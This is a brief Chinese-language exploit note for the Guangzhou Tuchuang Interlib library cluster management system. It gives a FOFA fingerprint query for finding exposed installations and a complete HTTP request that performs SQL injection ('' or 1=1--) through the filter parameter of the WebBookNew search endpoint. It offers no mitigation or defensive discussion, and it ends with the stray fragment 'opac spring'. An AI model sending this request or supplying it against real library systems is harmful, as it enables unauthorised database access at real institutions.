# 广州图创 图书馆集群管理系统

FOFA:

```
body="interlib/common/"
```



### webbooknew接口存在SQL注入漏洞

```
GET /interlib/websearch/WebBookNew?cmdACT=search_BookNew&showpage=1&filter=''+or+1=1--+ HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Upgrade-Insecure-Requests: 1
```





opac spring



